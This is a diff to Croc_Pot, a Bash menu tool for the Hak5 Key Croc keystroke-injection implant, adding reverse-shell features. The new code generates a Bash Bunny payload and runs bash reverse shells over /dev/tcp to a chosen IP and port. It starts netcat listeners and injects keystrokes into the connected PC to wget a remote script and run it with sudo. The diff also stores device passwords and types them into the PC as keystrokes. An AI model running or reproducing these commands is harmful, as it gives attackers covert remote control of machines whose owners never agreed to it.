@@ -4,7 +4,7 @@
 # Title:         Croc_Pot
 # Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
 # Author:        Spywill
-# Version:       1.3.2
+# Version:       1.3.7
 # Category:      Key Croc
 ##
 ##
@@ -63,7 +63,7 @@ MenuColor() {
 	echo -ne "\t\t\t\e[40;1m${1}${clear}${green})${clear}\e[40;38;5;202;4m${2} ${3} ${4} ${5} ${6} ${7}"
 }
 MenuEnd() {
-	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT              ⮊${clear}
+	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT              \U27B2${clear}
 \t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
 }
 Info_Screen() {
@@ -85,10 +85,10 @@ else
 fi
 }
 	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
-\e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} KeyCroc IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(enternet_test)      ${clear}
-\e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} KeyCroc VER: $(cat /root/udisk/version.txt)                   ${clear}
-\e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;38;5;232mΩ${clear}\e[40m${yellow} KeyCroc keyboard: $(sed -n 9p /root/udisk/config.txt)        ${clear}
-\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.3.2\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
+\e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(enternet_test)         ${clear}
+\e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} $(hostname) VER: $(cat /root/udisk/version.txt)                      ${clear}
+\e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;38;5;232mΩ${clear}\e[40m${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
+\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.3.7\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"	
 }
 function croc_title_loot() {
@@ -102,7 +102,7 @@ function invalid_entry() {
 #----Nmap mean
 ##
 function nmap_menu() {
-	IP_WLAN=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
+	local IP_WLAN=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
 	echo -ne "$(Info_Screen '
 -Start some basic nmap scan and save to loot folder\n
@@ -984,7 +984,6 @@ chess_game() {
 #
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
 # This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
-# You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 # Default values
 strength=3
 namePlayerA="Player"
@@ -2466,38 +2465,38 @@ function ai() {
 # Read row from remote
 # Returns row (0-7) as status code
 function receiveY() {
-	local i
-	while true; do
-		read -n 1 i
-		case $i in
-			[hH] ) return 0 ;;
-			[gG] ) return 1 ;;
-			[fF] ) return 2 ;;
-			[eE] ) return 3 ;;
-			[dD] ) return 4 ;;
-			[cC] ) return 5 ;;
-			[bB] ) return 6 ;;
-			[aA] ) return 7 ;;
-			* )
-				if $warnings ; then
-					warn "Invalid input '$i' for row from network (character between 'A' and 'H' required)!"
-				fi
-		esac
+local i
+while true; do
+	read -n 1 i
+	case $i in
+		[hH] ) return 0 ;;
+		[gG] ) return 1 ;;
+		[fF] ) return 2 ;;
+		[eE] ) return 3 ;;
+		[dD] ) return 4 ;;
+		[cC] ) return 5 ;;
+		[bB] ) return 6 ;;
+		[aA] ) return 7 ;;
+		* )
+			if $warnings ; then
+				warn "Invalid input '$i' for row from network (character between 'A' and 'H' required)!"
+			fi
+	esac
 	done
 }
 # Read column from remote
 # Returns column (0-7) as status code
 function receiveX() {
 	local i
-	while true; do
-		read -n 1 i
-		case $i in
-			[1-8] ) return $(( i - 1 )) ;;
-			* )
-				if $warnings ; then
-					warn "Invalid input '$i' for column from network (character between '1' and '8' required)!"
-				fi
-		esac
+while true; do
+	read -n 1 i
+	case $i in
+		[1-8] ) return $(( i - 1 )) ;;
+		* )
+			if $warnings ; then
+				warn "Invalid input '$i' for column from network (character between '1' and '8' required)!"
+			fi
+	esac
 	done
 }
 # receive movement from connected player
@@ -2661,51 +2660,51 @@ fi
 	p=1
 	while true ; do
 # initialize remote connection on first run
-		if ! $initializedGameLoop ; then
+	if ! $initializedGameLoop ; then
 # set cache export trap
-			trap "exitCache" 0
-			warn "Waiting for the other network player to be ready..." >&3
+	trap "exitCache" 0
+	warn "Waiting for the other network player to be ready..." >&3
 # exchange names
-			if (( remote == -1 )) ; then
-				read namePlayerA < $fifopipe
-				echo "$namePlayerB"
-				echo "connected with first player." >&3
-			elif (( remote == 1 )) ; then
-				echo "$namePlayerA"
-				read namePlayerB < $fifopipe
-				echo "connected with second player." >&3
-			fi
+	if (( remote == -1 )) ; then
+		read namePlayerA < $fifopipe
+		echo "$namePlayerB"
+		echo "connected with first player." >&3
+	elif (( remote == 1 )) ; then
+		echo "$namePlayerA"
+		read namePlayerB < $fifopipe
+		echo "connected with second player." >&3
+	fi
 # set this loop initialized
-			initializedGameLoop=true
+	initializedGameLoop=true
 		fi
 # reset global variables
-		selectedY=-1
-		selectedX=-1
-		selectedNewY=-1
-		selectedNewX=-1
+	selectedY=-1
+	selectedX=-1
+	selectedNewY=-1
+	selectedNewX=-1
 # switch current player
-		(( p *= (-1) ))
+	(( p *= (-1) ))
 # check check (or: if the king is lost)
-		if hasKing "$p" ; then
-			if (( remote == p )) ; then
-				receive < $fifopipe
-			elif isAI "$p" ; then
-				if (( computer-- == 0 )) ; then
-					echo "Stopping - performed all ai steps" >&3
-					exit 0
-				fi
-				ai "$p"
-			else
-				input "$p"
+	if hasKing "$p" ; then
+		if (( remote == p )) ; then
+			receive < $fifopipe
+		elif isAI "$p" ; then
+			if (( computer-- == 0 )) ; then
+			echo "Stopping - performed all ai steps" >&3
+		exit 0
 			fi
+			ai "$p"
 		else
-			title="Game Over!"
-			message="\e[1m$(namePlayer $(( p * (-1) )) ) wins the game!\e[1m\n"
-			draw >&3
-			anyKey
-			exit 0
+			input "$p"
 		fi
-	done | $piper > "$fifopipe"
+	else
+		title="Game Over!"
+		message="\e[1m$(namePlayer $(( p * (-1) )) ) wins the game!\e[1m\n"
+		draw >&3
+		anyKey
+		exit 0
+	fi
+done | $piper > "$fifopipe"
 # check exit code
 	netcatExit=$?
 	gameLoopExit=${PIPESTATUS[0]}
@@ -3571,7 +3570,7 @@ screen_shot() {
 -To start the Croc_Shot payload type in crocshot\n
 -This will save to loot/Croc_pot/screenshot\n
 -Option to take screenshot now\n
--For this to work properly run Croc_Pot_Payload.txt first to get OS detection\n')${clear}\n"
+-For this to work properly run Croc_Pot_Payload.txt first to get OS detection\n')${clear}\n\n"
 if [ -d /root/udisk/loot/Croc_pot/screenshot ]; then
 	sleep 1
 else
@@ -3587,7 +3586,7 @@ if [ -e "${Croc_Shot}" ]; then
 else
 	read -p "$(ColorBlue 'WOULD YOU LIKE TO INSTALL CROC_SHOT PAYLOAD YES OR NO AND PRESS [ENTER]:') " CS
 	case $CS in
-	yY] | [yY][eE][sS])
+	[yY] | [yY][eE][sS])
 		echo -ne "# Title:         CrocShot\n# Description:   Take screenshot of PC and save to loot/Croc_Pot/screenshot\n# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc\n#
 MATCH crocshot\n#\nPC_PW=LINUX      #<-----Edit LINUX-PC_PASSWD_HERE\n#\n  if [ -d /root/udisk/loot/Croc_pot/screenshot ]; then\n  LED B\n  sleep 1\nelse\n  LED SETUP\n  mkdir /root/udisk/loot/Croc_pot/screenshot
   sleep 1\nfi\n  ATTACKMODE HID STORAGE\n  CROC_OS=/root/udisk/loot/Croc_OS.txt\n  WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1\n  OS_CHECK=\$(sed -n 1p \${CROC_OS})\n    if [ \"\${OS_CHECK}\" = WINDOWS ]; then
@@ -4117,21 +4116,25 @@ function ssh_menu() {
 ##
 check_device() {
 if ping -c1 -w3 ${1} >/dev/null 2>&1; then
-	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;32mCONNECTED IP:${1} ${clear}${4} ${5} ${6} ${7} ${8}\n" >&2
+	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;32mCONNECTED IP:${1} ${clear}${4} ${5}" >&2
 else
-	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;31mNOT CONNECTED OR CAN'T BE REACHED ${clear}\n" >&2
+	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;31mNOT CONNECTED OR CAN'T BE REACHED ${clear}" >&2
 fi
 }
 ##
 #----SSH get PC ip from Croc_Pot_Payload
 ##
 os_connect() {
+	local CROC_OS=/root/udisk/loot/Croc_OS.txt
+	local OS_CHECK=$(sed -n 1p ${CROC_OS})
+if [ "${OS_CHECK}" = WINDOWS ]; then
 	local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
-	local CROC_OS_V=/root/udisk/loot/Croc_OS_ip.txt
-if [ -e "${CROC_OS_WIND}" ]; then
 	echo "$(sed -n 2p ${CROC_OS_WIND})"
 else
+if [ "${OS_CHECK}" = LINUX ]; then
+	local CROC_OS_V=/root/udisk/loot/Croc_OS_ip.txt
 	echo "$(sed -n 2p ${CROC_OS_V})"
+fi
 fi
 }
 ##
@@ -4149,7 +4152,7 @@ fi
 #----SSH owl get ip from mac
 ##
 owl_check() {
-	local OWL_IP=$(arp -a | sed -ne '/00:00:00:00:00:00/p' | sed -e 's/.*(\(.*\)).*/\1/') #place shark jack mac here
+	local OWL_IP=$(arp -a | sed -ne '/00:00:00:00:00:00/p' | sed -e 's/.*(\(.*\)).*/\1/')  #place Owl mac here
 if [[ "${OWL_IP}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
 	IP_O=${OWL_IP}
 else
@@ -4160,24 +4163,29 @@ p_ip() {
 	echo -ne "\e[40;93mPublic ip:${clear}\e[40;32m$(curl -s https://api.ipify.org)${clear}"
 }
 ##
-#----SSH check PC if port 22 open
+#----SSH check port 22 open or closed
 ##
 port_check() {
 for PORT in 22; do
-	timeout 1 bash -c "</dev/tcp/$(os_connect)/$PORT &>/dev/null" && echo -ne "\e[40;93mPort:${clear}\e[40;32m$PORT open${clear}"
+	timeout 1 bash -c "</dev/tcp/${1}/$PORT &>/dev/null"
+if [ "$?" -ne 0 ]; then
+	echo -ne "\e[40;93mPort:${clear}\e[40;31m$PORT closed${clear}\n"
+else
+	echo -ne "\e[40;93mPort:${clear}\e[40;32m$PORT open${clear}\n"
+fi
 done
 }
 	echo -ne "$(Info_Screen '
 -SSH into your HAK5 gear\n
 -SSH into connect PC\n
 -Ensure your devices are connected to the same local network\n')${clear}\n"
-check_device $(os_connect) CONNECTED PC: $(p_ip) $(port_check)
-check_device 172.16.42.1 WIFI PINEAPPLE:
-check_device 172.16.32.1 SQUIRREL:
-check_device 172.16.84.1 TURTLE:
-shark_check ; check_device ${IP_F} SHARK JACK:
-owl_check ; check_device ${IP_O} OWL:
-check_device 172.16.64.1 BASH BUNNY:
+check_device $(os_connect) CONNECTED PC: $(p_ip) ; port_check $(os_connect)
+check_device 172.16.42.1 WIFI PINEAPPLE: ; port_check 172.16.42.1
+check_device 172.16.32.1 SQUIRREL: ; port_check 172.16.32.1
+check_device 172.16.84.1 TURTLE: ; port_check 172.16.84.1
+shark_check ; check_device ${IP_F} SHARK JACK: ; port_check ${IP_F}
+#owl_check ; check_device ${IP_O} OWL: ; port_check ${IP_O}
+#check_device 172.16.64.1 BASH BUNNY: ; port_check 172.16.64.1
 echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
 ##
 #----SSH hak5 gear Passwd list
@@ -4470,23 +4478,51 @@ fi
 #----SSH to bash bunny
 ##
 ssh_bunny() {
-if [ "$(sed -n '6p' ${hak_gear})" != "" ]; then
-	echo -ne "\e[40m$(ColorYellow 'Bash Bunny passwd found')\n${clear}"
+	clear
+	echo -ne "$(Info_Screen '
+-Start ssh with connected PC to Bash bunny or\n
+-Start REVERSE SHELL with keycroc to bash bunny\n
+-Will need a small payload install on bash bunny\n
+-This will create a payload for the bash bunny and save it to tools folder\n
+-Place this in one of the bunny payloads switchs folder this is need for\n
+reverse shell From bunny to keycroc\n')${clear}\n\n"
+	local bunny_payload=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell
+	local bunny_payload_v=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell/payload.txt
+if [ -d "${bunny_payload}" ]; then
+	sleep 1
 else
-	echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'ENTER BASH BUNNY PASSWD')${clear}"${LINE_}
-	pw_list
+	sleep 1
+	mkdir -p ${bunny_payload}
+fi
+if [ -e "${bunny_payload_v}" ]; then
+	cat ${bunny_payload_v}
+	echo -ne "\n\e[40m${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n${clear}"
+else
+	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse shell to keycroc\n# Author:        Spywill\n# Version:       1.0
+# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nLED ATTACK\n/bin/bash -i >& /dev/tcp/$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)/4444 0>&1
+LED R" | tee ${bunny_payload_v}
+	echo -ne "\n\e[40m${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n${clear}"
+fi
+	read -p "$(ColorBlue 'START SSH SHELL WITH CONNECTED PC Y/N AND PRESS [ENTER]:') " BUNNY_S
+	case $BUNNY_S in
+	[yY] | [yY][eE][sS])
+		if [ "$(sed -n '6p' ${hak_gear})" != "" ]; then
+		echo -ne "\e[40m$(ColorYellow 'Bash Bunny passwd found')\n${clear}"
+else
+		echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'ENTER BASH BUNNY PASSWD')${clear}"${LINE_}
+		pw_list
 fi
 	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local OS_CHECK=$(sed -n 1p ${CROC_OS})
 if [ "${OS_CHECK}" = WINDOWS ]; then
-	Q GUI d
-	Q GUI r
-	sleep 1
-	Q STRING "powershell"
-	Q ENTER
-	sleep 2
-	Q STRING "ssh root@172.16.64.1"
-	Q ENTER
+		Q GUI d
+		Q GUI r
+		sleep 1
+		Q STRING "powershell"
+		Q ENTER
+		sleep 2
+		Q STRING "ssh root@172.16.64.1"
+		Q ENTER
 else
 	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
 	case $HOST_CHECK in
@@ -4501,7 +4537,7 @@ else
 		Q ENTER
 		sleep 1
 		Q STRING $(sed -n '6p' ${hak_gear})
-		Q ENTER;;
+		Q ENTER ;;
 	parrot)
 		Q ALT F2
 		sleep 1
@@ -4512,7 +4548,7 @@ else
 		Q ENTER
 		sleep 1
 		Q STRING $(sed -n '6p' ${hak_gear})
-		Q ENTER;;
+		Q ENTER ;;
 	*)
 		Q ALT F2
 		sleep 1
@@ -4523,9 +4559,136 @@ else
 		Q ENTER
 		sleep 1
 		Q STRING $(sed -n '6p' ${hak_gear})
-		Q ENTER;;
+		Q ENTER ;;
 	esac
-fi
+fi ;;
+	[nN] | [nN][oO])
+		read -p "$(ColorBlue 'START REVERSE SHELL WITH BUNNY Y/N AND PRESS [ENTER]:') " BUNNY_R
+		case $BUNNY_R in
+	[yY] | [yY][eE][sS])
+		Q GUI d
+		sleep 1
+		Q STRING "terminal"
+		Q ENTER
+		Q ENTER
+		sleep 1
+		Q STRING "i=\$(whoami)"
+		Q ENTER
+		Q STRING "if [ -e /home/\${i}/bb.sh ]; then"
+		Q ENTER
+		Q STRING "echo \"bb.sh is installed\""
+		Q ENTER
+		Q STRING "else"
+		Q ENTER
+		Q STRING "echo \"installing bb.sh\""
+		Q ENTER
+		Q STRING "wget bashbunny.com/bb.sh"
+		Q ENTER
+		Q STRING "fi"
+		Q ENTER
+		sleep 5
+		Q STRING "sudo bash ./bb.sh"
+		Q ENTER
+		sleep 2
+		Q STRING "c"
+		sleep 2
+		Q STRING "exit"
+		Q ENTER
+		Q ALT-TAB
+		clear
+		LED ATTACK
+		nc -lnvp 4444 -s $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ; ssh_bunny ;;
+		esac
+	esac
+}
+##
+#----SSH reverse shell with netcat
+##
+croc_reverse_shell() {
+	clear
+remote_listener() {
+	clear
+	echo -ne "$(Info_Screen '
+-Netcat start a reverse shell on your keycroc\n
+-Remotely access your keycroc\n
+-Frist On the listening pc enter this below\n
+--> \e[40;32mnc -lnvp PORT# -s IP OF LISTENING PC\e[0m\e[40;93m <--\n
+-On Keycroc Enter ip of the listening pc and port number\n')${clear}\n\n"
+	echo -ne "\e[40m$(ColorBlue 'START REVERSE SHELL YES OR NO AND PRESS [ENTER] ')${clear}"; read RS
+	case $RS in
+	[yY] | [yY][eE][sS])
+		local SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
+	if [ -e "${SAVE_SHELL}" ]; then
+		echo -ne "\n$(sed -n 1p ${SAVE_SHELL})\n$(sed -n 2p ${SAVE_SHELL})\n"
+		echo -ne "$(ColorYellow 'Found saved shell setup use them Y/N [ENTER]')"; read save_shell
+	case $save_shell in
+	[yY] | [yY][eE][sS])
+		echo -ne "\n\e[40;93mLISTENING PC SETUP \e[40;32mnc -lnvp $(sed -n 2p ${SAVE_SHELL}) -s $(sed -n 1p ${SAVE_SHELL})${clear}\n"
+		/bin/bash -i >& /dev/tcp/$(sed -n 1p ${SAVE_SHELL})/$(sed -n 2p ${SAVE_SHELL}) 0>&1 & ;;
+	[nN] | [nN][oO])
+		rm ${SAVE_SHELL}
+		echo -ne "\e[40m$(ColorBlue 'ENTER IP OF LISTENING PC PRESS [ENTER] ')${clear}"; read IP_RS ; echo ${IP_RS} >> ${SAVE_SHELL}
+		echo -ne "\e[40m$(ColorBlue 'ENTER PORT OF LISTENING PC PRESS [ENTER] ')${clear}"; read IP_RSP ; echo ${IP_RSP} >> ${SAVE_SHELL}
+		echo -ne "\n\e[40;93mLISTENING PC SETUP \e[40;32mnc -lnvp ${IP_RSP} -s ${IP_RS}${clear}\n"
+		/bin/bash -i >& /dev/tcp/${IP_RS}/${IP_RSP} 0>&1 & ;;
+	*)
+		invalid_entry ; croc_reverse_shell ;;
+	esac
+	else
+		echo -ne "\e[40m$(ColorRed 'Did not find any saved shell setup')\n"
+		echo -ne "\e[40m$(ColorBlue 'ENTER IP OF LISTENING PC PRESS [ENTER] ')${clear}"; read IP_RS ; echo ${IP_RS} >> ${SAVE_SHELL}
+		echo -ne "\e[40m$(ColorBlue 'ENTER PORT OF LISTENING PC PRESS [ENTER] ')${clear}"; read IP_RSP ; echo ${IP_RSP} >> ${SAVE_SHELL}
+		echo -ne "\n\e[40;93mLISTENING PC SETUP \e[40;32mnc -lnvp ${IP_RSP} -s ${IP_RS}${clear}\n"
+		/bin/bash -i >& /dev/tcp/${IP_RS}/${IP_RSP} 0>&1 &
+	fi ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ; croc_reverse_shell ;;
+	esac
+}
+croc_listener() {
+	clear
+	echo -ne "$(Info_Screen '
+-Netcat start a reverse shell on your keycroc\n
+-Listening on Keycroc access your PC\n
+-This will start listening on croc enter this below\n
+-On remote PC 
+--> \e[40;32m/bin/bash -i >& /dev/tcp/$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)/4444 0>&1\e[0m\e[40;93m <--\n
+-On Keycroc Enter ip of the listening pc and port number\n')${clear}\n\n"
+	echo -ne "\e[40m$(ColorBlue 'START LISTENING ON CROC YES OR NO AND PRESS [ENTER] ')${clear}"; read RL
+	case $RL in
+	[yY] | [yY][eE][sS])
+		clear
+		echo -ne "\n\e[40;93mREMOTE PC SETUP \e[40;32m/bin/bash -i >& /dev/tcp/$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)/4444 0>&1${clear}\n"
+		nc -lnvp 4444 -s $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ; croc_reverse_shell ;;
+	esac
+}
+##
+#----SSH croc reverse shell Menu
+##
+MenuTitle REVERSE SHELL MENU
+MenuColor 1 REMOTE LISTENER ; echo -ne "     ${clear}\n"
+MenuColor 2 CROC LISTENER ; echo -ne "     ${clear}\n"
+MenuColor 3 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
+MenuEnd
+	read r_s
+	case $r_s in
+	1) remote_listener ; ssh_menu ;;
+	2) croc_listener ; ssh_menu ;;
+	3) main_menu ;;
+	0) exit 0 ;;
+	*) invalid_entry ; ssh_menu ;;
+	esac
+
 }
 ##
 #----SSH Menu
@@ -4542,7 +4705,8 @@ MenuColor 7 LAN TURTLE ; echo -ne "             ${clear}\n"
 MenuColor 8 SIGNAL OWL ; echo -ne "             ${clear}\n"
 MenuColor 9 SHARK JACK ; echo -ne "             ${clear}\n"
 MenuColor 10 BASH BUNNY ; echo -ne "            ${clear}\n"
-MenuColor 11 RETURN TO MAIN MENU ; echo -ne "     ${clear}\n"
+MenuColor 11 REVERSE SHELL ; echo -ne "         ${clear}\n"
+MenuColor 12 RETURN TO MAIN MENU ; echo -ne "     ${clear}\n"
 MenuEnd
 	read ssh_a
 	case $ssh_a in
@@ -4556,7 +4720,8 @@ MenuEnd
 	8) ssh_owl ; ssh_menu ;;
 	9) ssh_shark ; ssh_menu ;;
 	10) ssh_bunny ; ssh_menu ;;
-	11) main_menu ;;
+	11) croc_reverse_shell ; ssh_menu ;;
+	12) main_menu ;;
 	0) exit 0 ;;
 	*) invalid_entry ; ssh_menu ;;
 	esac
@@ -4717,7 +4882,7 @@ remove_croc_pot() {
 		rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
 		rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
 		rm /root/udisk/payloads/Getonline.txt /root/udisk/payloads/Quick_Start_C2.txt
-		rm /root/udisk/loot/Croc_OS.txt /root/udisk/loot/Croc_OS_ip.txt
+		rm /root/udisk/loot/Croc_OS.txt /root/udisk/loot/Croc_OS_ip.txt /root/udisk/loot/Croc_OS_wind.txt
 		rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt
 		apt-get autoremove
 		exit 0 ;;
